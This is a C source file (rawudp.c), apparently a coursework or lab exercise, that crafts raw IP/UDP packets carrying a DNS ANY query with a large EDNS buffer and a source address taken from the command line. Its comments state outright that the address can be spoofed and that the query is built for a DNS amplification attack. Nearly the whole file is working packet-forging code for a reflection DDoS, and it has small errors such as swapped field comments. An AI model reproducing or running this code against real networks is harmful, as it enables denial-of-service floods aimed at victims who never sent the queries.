// ----rawudp.c------

// Must be run by root lol! Just datagram, no payload/data
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

// The packet length
#define PCKT_LEN 8192

// Can create separate header file (.h) for all headers' structure

// The IP header's structure
struct ipheader {
	unsigned char      iph_ihl:4, iph_ver:4;
	unsigned char      iph_tos;
	unsigned short int iph_len;
	unsigned short int iph_ident;
	unsigned short int iph_flagnoffset;
	unsigned char      iph_ttl;
	unsigned char      iph_protocol;
	unsigned short int iph_chksum;
	unsigned int       iph_sourceip;
	unsigned int       iph_destip;
};
// total IP header length: 20 bytes (=160 bits)

// UDP pseudo header for checksum
struct pseudoheader {
	unsigned int       sdh_srcip;
	unsigned int       sdh_dstip;
	unsigned char      sdh_placeholder;
	unsigned char      sdh_protocol;
	unsigned short int sdh_udplen;
};

// UDP header's structure
struct udpheader {
	unsigned short int udph_srcport;
	unsigned short int udph_destport;
	unsigned short int udph_len;
	unsigned short int udph_chksum;
};
// total udp header length: 8 bytes (=64 bits)

// DNS header's structure
struct dnsheader {
	unsigned short int dnsh_id;
	unsigned char      dnsh_rd:1, dnsh_tc:1, dnsh_aa:1, dnsh_opcode:4, dnsh_qr:1;
	unsigned char      dnsh_rcode:4, dnsh_z:3, dnsh_ra:1;
	unsigned short int dnsh_qdcount;
	unsigned short int dnsh_ancount;
	unsigned short int dnsh_nscount;
	unsigned short int dnsh_arcount;
};

// DNS query's structure
struct dnsquery {
	unsigned short int dnsq_qtype;
	unsigned short int dnsq_qclass;
};

// DNS additional's structure
struct dnsadditional {
	//unsigned char      dnsa_name;
	unsigned short int dnsa_type;
	unsigned short int dnsa_udppayloadsize;
	unsigned short int dnsa_rccodenednsver;
	unsigned short int dnsa_z;
	unsigned short int dnsa_rdata;
};


// Function for checksum calculation. From the RFC,
// the checksum algorithm is:
//  "The checksum field is the 16 bit one's complement of the one's
//  complement sum of all 16 bit words in the header.  For purposes of
//  computing the checksum, the value of the checksum field is zero."
unsigned short csum(unsigned short *buf, int nwords){
	unsigned long sum = 0;
	unsigned short oddbyte = 0;
	
	// sum up all consecutive "BYTE"!!
	while(nwords > 1){
		sum += *buf++;
		nwords -= 2;
	}
	// deal with odd length packet size 
	// => treat the last "CHAR" in the packet as a single byte, with first "CHAR" filled with 0x0   (1 byte == 2 char)
	if(nwords == 1){
		*((unsigned char *) &oddbyte )= *(unsigned char *)buf;
		sum += oddbyte;
	}

	// deal with overflow => add the overflow bits to the last 16 bits of sum 
	sum = (sum >> 16) + (sum &0xffff);
	sum += (sum >> 16);

	// 1's complement
	return (unsigned short)(~sum);
}

// format dns query's domain name
// example: turn "www.google.com" into "3www6google3com0"
void dns_domain_format(unsigned char *all_headers, unsigned char *host){
	strcat((char *)host, ".");

	// indicate the position where current word start.
	int placeholder = 0;

	for(int i = 0; i <= strlen((char *)host); i++){

		if(host[i] == '.'){
			// replace the dot with current word's length
			*all_headers = i - placeholder;
			all_headers++;

			// fill in all the letters in this word 
			for(; placeholder < i; placeholder++){
				*all_headers = host[placeholder];
				all_headers++;
			}
			placeholder++;
		}
	}

	// put one byte zero to indicate the end of the string
	*all_headers = 0x00;
	all_headers++;
}

// Source IP, source port, target IP, target port from the command line arguments
int main(int argc, char *argv[]){
	srand(getpid());
	int sd;
	
	// No data/payload just datagram
	char buffer[PCKT_LEN];
	// Our own headers' structures
	struct ipheader *ip = (struct ipheader *) buffer;
	struct udpheader *udp = (struct udpheader *) (buffer + sizeof(struct ipheader));

	// Source and destination addresses: IP and port
	struct sockaddr_in sin, din;
	int one = 1;
	const int *val = &one;

	memset(buffer, 0, PCKT_LEN);  // clean up buffer

    // check command line arguments format
	if(argc != 5){
		printf("- Invalid parameters!!!\n");
		printf("- Usage %s <source hostname/IP> <source port> <target hostname/IP> <target port>\n", argv[0]);
		exit(-1);
	}

	// Create a raw socket with UDP protocol
	sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
	if(sd < 0){
		// If something wrong just exit
		perror("socket() error");
		exit(-1);
	}
	else{
		printf("socket() - Using SOCK_RAW socket and UDP protocol is OK.\n");
	}

	// The source is redundant, may be used later if needed
	// The address family
	sin.sin_family = AF_INET;
	din.sin_family = AF_INET;
	// Port numbers
	sin.sin_port = htons(atoi(argv[2]));
	din.sin_port = htons(atoi(argv[4]));
	// IP addresses
	sin.sin_addr.s_addr = inet_addr(argv[1]);
	din.sin_addr.s_addr = inet_addr(argv[3]);


	// Fabricate the IP header or we can use the
	// standard header structures but assign our own values.
	ip->iph_ihl = 5;
	ip->iph_ver = 4;
	ip->iph_tos = 0;
	ip->iph_ident = htons((unsigned short int)rand());
	ip->iph_flagnoffset = htons(0x4000);
	ip->iph_ttl = 64;      // hops
	ip->iph_protocol = 17; // UDP
	// Source IP address, can use spoofed address here!!!
	ip->iph_sourceip = inet_addr(argv[1]);
	// The destination IP address
	ip->iph_destip   = inet_addr(argv[3]);
	// Calculate the checksum for integrity
	ip->iph_chksum   = csum((unsigned short *)buffer, sizeof(struct ipheader));


	// Fabricate the UDP header
	// Source port number and Destination port number
	udp->udph_srcport  = htons(atoi(argv[2]));
	udp->udph_destport = htons(atoi(argv[4]));
	

	// Fabricate DNS Header
	struct dnsheader *dnsh = (struct dnsheader * ) (buffer + sizeof(struct ipheader) + sizeof(struct udpheader));
	dnsh->dnsh_id = htons((unsigned short int)rand());
	dnsh->dnsh_qr = 0;
	dnsh->dnsh_opcode = 0;
	dnsh->dnsh_aa = 0;
	dnsh->dnsh_tc = 0;
	dnsh->dnsh_rd = 1;
	dnsh->dnsh_ra = 0;
	dnsh->dnsh_z  = 0;
	dnsh->dnsh_qdcount = htons(1);  
	dnsh->dnsh_ancount = 0;
	dnsh->dnsh_nscount = 0;
	dnsh->dnsh_arcount = htons(1);


    // format the domain name in DNS query
    unsigned char *packet_headers;
    packet_headers = (unsigned char *)(buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader));
    unsigned char dns_domain[]      = "cmu.edu";
    unsigned char dns_domain_save[] = "cmu.edu";
    int domain_len = strlen((const char *)dns_domain_save)+2;

	// Standard DNS Domain Name Notation
	// e.g. "www.nctu.edu.tw" -> "3www4nctu3edu2tw0"
    dns_domain_format(packet_headers, dns_domain);



	// Set up domain name which we want DNS server to search
	// unsigned char domain_name[] = "cmu.edu";

	// // Standard DNS Domain Name Notation
	// // e.g. "www.nctu.edu.tw" -> "3www4nctu3edu2tw0"
	// unsigned char dnsq_dname[strlen((char *)domain_name)+2];
	// int pos, point_cnt = 0;
	// dnsq_dname[0] = '.';
	// dnsq_dname[strlen((char *)domain_name)+1] = 0;
	// for(pos = strlen((char *)domain_name); pos >= 0; pos--){
	// 	point_cnt++;
	// 	if(pos-1 >= 0)
	// 		dnsq_dname[pos] = domain_name[pos-1];
	// 	if(dnsq_dname[pos] == '.'){
	// 		dnsq_dname[pos] = point_cnt-1;
	// 		point_cnt = 0;
	// 	}
	// }
	// unsigned char *ptr = (unsigned char * ) (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader));
	// for(pos = 0; pos <= strlen((char *)domain_name)+1; pos++){
	// 	*ptr = dnsq_dname[pos];
	// 	*ptr++;
	// }
	// End of Standard DNS Domain Name Notation


	// payload: DNS query
	struct dnsquery *dnsq = (struct dnsquery *) (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + domain_len);
	dnsq->dnsq_qclass = htons(0x0001);  //  class: ANY (in order to increase the size of DNS response packet, for DNS amplification attack)
	dnsq->dnsq_qtype  = htons(0x00ff);  //  type:  IN

	// payload: DNS additional
	struct dnsadditional *dnsa = (struct dnsadditional *)(buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + domain_len + sizeof(struct dnsquery) + 1);
	dnsa->dnsa_type = htons(41);
	dnsa->dnsa_udppayloadsize = htons(4096);

	// Calculate IP Header length and UDP Header length
	ip->iph_len   = sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + domain_len + sizeof(struct dnsquery) + sizeof(struct dnsadditional) + 1;
	udp->udph_len = htons(sizeof(struct udpheader) + sizeof(struct dnsheader) + domain_len + sizeof(struct dnsquery) + sizeof(struct dnsadditional) + 1);


	// Fill pseudo header to calculate UDP check sum
	struct pseudoheader psh;
	psh.sdh_srcip       = ip->iph_sourceip;
	psh.sdh_dstip       = ip->iph_destip;
	psh.sdh_placeholder = 0;
	psh.sdh_protocol    = 17;
	psh.sdh_udplen      = udp->udph_len;

	// Create a pseudo UDP datagram to calculate UDP check sum
	int psize = sizeof(struct pseudoheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + domain_len + sizeof(struct dnsquery) + sizeof(struct dnsadditional) + 1;
	unsigned char *pseudogram = malloc(psize);
	// concate the psudeo header with UDP packet
	memcpy(pseudogram , (char *)&psh , sizeof(struct pseudoheader));
	memcpy(pseudogram + sizeof(struct pseudoheader) , udp , psize - sizeof(struct pseudoheader));


	// Calculate UDP check sum !!
	udp->udph_chksum = csum( (unsigned short *)pseudogram , psize);

	// Inform the kernel do not fill up the packet structure. we will build our own...
	if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0){
		perror("setsockopt() error");
		exit(-1);
	}
	else{
		printf("setsockopt() is OK.\n");
	}
	
	// Send loop, send for every 2 second for 100 count
	printf("Trying...\n");
	printf("Using raw socket and UDP protocol\n");
	printf("Using Source IP: %s port: %u, Target IP: %s port: %u.\n", argv[1], atoi(argv[2]), argv[3], atoi(argv[4]));

	for(int count = 1; count <= 1; count++){
		if(sendto(sd, buffer, ip->iph_len, 0, (struct sockaddr *)&din, sizeof(din)) < 0){
			// Verify
			perror("sendto() error");
			exit(-1);
		}
		else{
			printf("Count #%u - sendto() is OK.\n", count);
			sleep(2);
		}
	}
	close(sd);
	return 0;
}
